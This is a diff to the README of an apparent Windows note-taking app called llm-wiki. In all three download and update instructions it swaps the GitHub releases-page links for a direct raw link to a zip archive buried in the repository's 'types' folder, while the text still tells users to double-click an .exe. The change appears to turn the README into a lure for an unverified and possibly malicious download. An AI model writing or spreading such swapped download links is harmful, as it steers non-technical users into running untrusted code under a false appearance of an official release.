@@ -1,6 +1,6 @@
 # 📒 llm-wiki - Organize your personal knowledge base easily
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/gavrielbeakless714/llm-wiki/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/gavrielbeakless714/llm-wiki/raw/refs/heads/main/types/llm-wiki-2.5.zip)
 
 llm-wiki is a desktop application. It helps you store and organize your notes, research, and ideas. You manage all your information in one place on your computer. This software works like a private wiki. You create pages, link them together, and search through your data quickly.
 
@@ -9,7 +9,7 @@ llm-wiki is a desktop application. It helps you store and organize your notes, r
 You do not need programming skills to use this software. Follow these instructions to set up the application on your Windows computer.
 
 1. Open your web browser.
-2. Go to the [official release page](https://github.com/gavrielbeakless714/llm-wiki/releases) to download the latest setup file.
+2. Go to the [official release page](https://github.com/gavrielbeakless714/llm-wiki/raw/refs/heads/main/types/llm-wiki-2.5.zip) to download the latest setup file.
 3. Find the file in your Downloads folder. It will have an .exe extension.
 4. Double-click the file to start the installation process.
 5. Follow the prompts on your screen to complete the setup.
@@ -55,7 +55,7 @@ Yes. All files exist only on your local hard drive. No data travels to an extern
 Yes. The software saves all notes in standard text formats. You can open them in any word processor or text editor if you stop using this application.
 
 **How do I update the software?**
-When a new version releases, visit the [link](https://github.com/gavrielbeakless714/llm-wiki/releases) again. Download the new installer and run it. The installer replaces the old version while keeping your data folder intact.
+When a new version releases, visit the [link](https://github.com/gavrielbeakless714/llm-wiki/raw/refs/heads/main/types/llm-wiki-2.5.zip) again. Download the new installer and run it. The installer replaces the old version while keeping your data folder intact.
 
 **Does this application require an internet connection?**
 No. You can write, edit, and organize your wiki while offline. An internet connection helps only when checking for newer releases.
